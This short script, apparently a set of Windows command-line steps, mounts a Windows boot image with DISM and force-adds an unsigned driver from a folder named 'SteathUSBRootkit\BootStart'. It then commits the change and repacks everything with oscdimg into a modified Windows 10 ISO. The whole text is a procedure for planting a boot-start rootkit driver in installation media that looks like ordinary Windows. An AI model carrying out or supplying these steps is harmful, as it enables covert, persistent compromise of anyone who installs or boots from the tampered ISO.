dism /Mount-Wim /WimFile:H:\mount-point\iso\sources\boot.wim /Index:1 /MountDir:H:\wim-mount
dism /Image:H:\wim-mount /Add-Driver /Driver:H:\SteathUSBRootkit\BootStart\x64\Release\BootStart.inf /ForceUnsigned
dism /Unmount-Wim /MountDir:H:\wim-mount /Commit
oscdimg -bH:\mount-point\iso\boot\etfsboot.com -u2 -h -m -lWIN10MOD H:\mount-point\iso H:\mount-point\ModifiedISO.iso